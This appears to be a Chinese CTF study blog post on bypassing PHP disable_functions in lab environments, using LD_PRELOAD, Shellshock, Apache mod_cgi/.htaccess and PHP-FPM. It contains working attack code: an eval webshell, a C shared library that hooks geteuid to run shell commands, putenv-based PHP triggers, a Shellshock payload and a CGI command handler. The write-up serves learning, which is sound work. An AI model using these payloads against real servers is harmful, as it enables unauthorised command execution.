# bypass disable_function 学习

## LD_PRELOAD

我是在做了 buu的 REC ME 来做这个系列

所以 LD_PRELOAD 已经有了解了

我们来做这个题目

```cobol
CTFHub Bypass disable_function —— LD_PRELOAD
 
本环境来源于AntSword-Labs
<!DOCTYPE html>
<html>
<head>
    <title>CTFHub Bypass disable_function —— LD_PRELOAD</title>
</head>
<body>
<h1>CTFHub Bypass disable_function —— LD_PRELOAD</h1>
<p>本环境来源于<a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a></p>
</body>
</html>
<?php
@eval($_REQUEST['ant']);
show_source(__FILE__);
?>
```

通过request接受参数 直接传递 然后执行

我们首先看看 phpinfo()



<img src="https://i-blog.csdnimg.cn/blog_migrate/597c213bb42ff7a109dee833eabf8c64.png" alt="" style="max-height:196px; box-sizing:content-box;" />
这里我们看到了 过滤了 mail 和 system

题目原本就给了马 我们直接来连接





<img src="https://i-blog.csdnimg.cn/blog_migrate/42bcb7491611f27b0dc23cb5620eb7f4.png" alt="" style="max-height:122px; box-sizing:content-box;" />


发现被限制了

我们通过传递 so 和 php 来劫持环境变量

但是这里mail函数被禁用

我们使用 error_log('',1,'','');

我们编写一下hack.so

```cpp
#include<stdio.h>
#include<string.h>
#include<stdlib.h>
 
void payload(){
 
system("ls / -> /var/tmp/flag.txt");
}
 
int geteuid(){
    
    if(getenv("LD_PRELOAD") == NULL) { return 0; }
    unsetenv("LD_PRELOAD");
    payload();
    
}
```

```vbnet
gcc -shared -fPIC hack.c -o hack.so
```

然后还需要php 使用putenv() 调用so文件

```php
<?php
putenv("LD_PRELOAD=/var/tmp/hack.so");
mail("","","","");
error_log("",1,"","");
?>
```

然后我们上传到 /var/tmp文件夹中



<img src="https://i-blog.csdnimg.cn/blog_migrate/e3b448b4defd44a0f002d1983cc5c9c1.png" alt="" style="max-height:340px; box-sizing:content-box;" />




然后通过include("/var/tmp/hack.php");来执行php文件

```ruby
?ant=include('/var/tmp/hack.php');
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/cc7f0f9dd5857efd500b8876109e36b4.png" alt="" style="max-height:491px; box-sizing:content-box;" />


然后我们执行 /readflag即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/115789a149e35bdc77efaa284fd97fc3.png" alt="" style="max-height:167px; box-sizing:content-box;" />


自己编写确实事故很多 我们直接用现成的吧

## shellshock

这里是php破壳 rce

在bash 4.x存在命令执行漏洞

我们首先看看原型

我们首先了解一下bash

```php
bash 允许自定义函数 并且使用函数名调用函数
 
例如
 
function test(){
echo "this is test";
}
 
test #调用这个函数
 
#输出 this is test
```

我们看看bash存的内容是什么

```cobol
KEY = test
VALUE = () { echo "this is test"; }
```

那我们修改为恶意代码呢

```cobol
export ShellShock='() { :; }; echo;/usr/bin/whoami'
bash
>root
 
这里为什么呢 
 
KEY = ShellShock
VALUE = '(){:;}; echo; /user/bin/whoami'
```

这样 如果我们执行了bash  ShellShock就会作为环境变量直接执行

下面的value 就会被作为一整句代码 执行 这样就绕过了

所以这个题目我们可以写一个php设置环境变量

```cobol
<?php
putenv("PHP_ABC=() { :; }; ls / > /var/www/html/flag.txt");
error_log("",1,"","");
?>
 
这里
 
KEY=PHP_ABC
VALUE= (){:;};ls / > /var/www/html/flag.txt
```

这里缩进要注意 不知道为什么 没有缩进就无法实现

访问flag即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/42343bb16b9b08948ae09210573a31e0.png" alt="" style="max-height:521px; box-sizing:content-box;" />


重新修改命令即可 /readflag



<img src="https://i-blog.csdnimg.cn/blog_migrate/5d6d1656aa102fad6253b386edf725e9.png" alt="" style="max-height:139px; box-sizing:content-box;" />


或者直接使用 蚁剑的插件绕过即可

## Apache Mod CGI

这里是通过 CGI 和 htaccess绕过 disable_function

```sql
第一，必须是apache环境
第二，mod_cgi已经启用
第三，必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none
第四，必须有权限写.htaccess文件
```

我们通过 htaccess文件指定可以执行cgi文件 然后通过cgi文件执行命令

这里是格式

.htaccess

```cobol
Options +ExecCGI    
AddHandler  cgi-script .后缀
```

CGI

```bash
#!/bin/sh
echo&whoami
```

我们随便取一个

然后通过 chmod("名字",0777);

加权限

但是我本地无法链接 所以使用 插件

## PHP-FPM

 [攻击PHP-FPM 实现Bypass Disable Functions - 知乎](https://zhuanlan.zhihu.com/p/75114351) 

首先了解什么是PHP-FPM

首先以前是如何访问服务呢 是下面这个

```csharp
www.baidu.com
     |
     |
webserver(apache)
     |
     |
var(var/www/html)
     |
     |
返回响应
```

但是出现了 越来越多语言 例如php java

不可能都让webserver识别

那我们怎么实现呢  例如php webserver 就将 请求发给 php解释器

让他来处理数据

```swift
但是 webserver不是简简单单的进行转发 
 
而是对请求包进行封装 然后发送php解释器
 
这个协议就是 CGI 对其封装的程序就是 CGI程序
 
（后来协议和程序都升级了 变成了 FAST-CGI）
```

现在请求包已经封装完成了 应该发给谁呢

```swift
于是就发给 PHP-FPM 通过解包转为数据包
 
按照 FAST-CGI 将 TCP流 解析为 数据
```

例如下面这样

```swift
  www.baidu.com
        |
        |
      nginx
        |
        |
nginx加载 FAST-CGI模块
        |
        |
FAST-CGI对数据进行封装为TCP流，并且发送PHP-FPM
        |
        |
PHP-FPM将数据解析 调用php文件
        |
        |
PHP-FPM将解析完的文件传递回nginx
        |
        |
nginx将响应返回给浏览器
```

所以 PHP-FPM 就是 FAST-CGI的解析器

```swift
PHP-FPM默认在9000端口打开
 
那我们如果自己构造 FAST-CGI协议 发送给 PHP-FPM 那我们是不是就可以直接获取信息
```

了解完我们来做题

首先看看是否开启PHP-FPM程序

有小马了



<img src="https://i-blog.csdnimg.cn/blog_migrate/5155a6f41fe4e3e92b0ac039487071ed.png" alt="" style="max-height:333px; box-sizing:content-box;" />


发现开启了 默认是 9000

很简单我们直接去蚁剑插件绕过



<img src="https://i-blog.csdnimg.cn/blog_migrate/0adb5386aa5a8d47ac7458e221900d8d.png" alt="" style="max-height:312px; box-sizing:content-box;" />


指定

<img src="https://i-blog.csdnimg.cn/blog_migrate/ecaeb71e24539a3584217bb830f2bb21.png" alt="" style="max-height:253px; box-sizing:content-box;" />


上传了

然后去访问这个文件



<img src="https://i-blog.csdnimg.cn/blog_migrate/6e408ee8bfc494a5d8d6bc5cb12d9c36.png" alt="" style="max-height:212px; box-sizing:content-box;" />


我们现在主要研究一下 蚁剑上传的是什么文件

我们从运行开始看

```cobol
set_time_limit(120);
$headers=get_client_header();
$host = "127.0.0.1";
$port = 63673;
$errno = '';
$errstr = '';
$timeout = 30;
$url = "/index.php";
 
if (!empty($_SERVER['QUERY_STRING'])){
    $url .= "?".$_SERVER['QUERY_STRING'];
};
这里主要是向 63673端口发送了payload
 
其实就睡 在 63673端口 又开启一台 webserver 监听了 63673端口 并且不是用php.ini
 
这样就不会执行 disable_function
```

那么这里是通过什么方法来开启webserver呢

```cobol
//首先随机生成一个php server 端口
let port = Math.floor(Math.random() * 5000) + 60000; // 60000~65000
 
 
然后就会验证 fpm端口是否可行
 
然后就会构造请求包 攻击 fpm
 
触发payload  执行开启新webserver
```

这里就是通过 fpm执行 ext   开启新的webserver 然后通过转发shell到 新开的webserver上

```cobol
为什么ext 可以被执行 并且不会受到disable_function限制
 
这里是通过 直接预留 dll/so 文件中的位置 
 
要执行什么命令 就写入什么命令 然后通过dll/so执行
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/c7325a1dbcfd08d24ca5b597cf64344c.png" alt="" style="max-height:235px; box-sizing:content-box;" />